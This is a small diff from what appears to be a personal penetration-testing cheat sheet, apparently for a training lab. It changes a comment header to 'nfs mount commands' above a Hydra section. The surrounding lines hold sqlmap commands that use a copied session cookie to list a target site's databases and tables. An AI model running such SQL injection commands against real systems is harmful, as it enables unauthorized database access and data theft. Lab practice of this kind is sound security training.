@@ -5,7 +5,8 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie va
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
 
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs 
-##
+##nfs mount commands
+
 # ========================
 # 🔐 HYDRA CHEATSHEET
 # ========================
